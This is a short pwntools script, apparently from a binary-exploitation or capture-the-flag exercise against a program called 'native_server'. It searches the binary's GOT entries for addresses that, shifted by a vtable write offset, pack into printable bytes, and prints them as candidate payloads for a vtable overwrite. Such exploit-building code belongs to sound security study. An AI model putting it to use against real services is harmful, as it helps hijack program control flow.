from pwn import *
import string

p = ELF('native_server')

VTABLE_WRITE_OFFSET = 0x40


def is_printable(_bytes):
    for b in _bytes:
        if b not in string.printable.encode():
            return False
    return True


def get_possibly_called_gots():
    funcs = {}
    for func, addr in p.got.items():
        payload = p32(addr - VTABLE_WRITE_OFFSET).rstrip(b'\0')
        if is_printable(payload):
            funcs[func] = payload.decode()
    return funcs


def main():
    available_gots = get_possibly_called_gots()
    for func, payload in available_gots.items():
        print(f'{func}: {payload}')


if __name__ == "__main__":
    main()
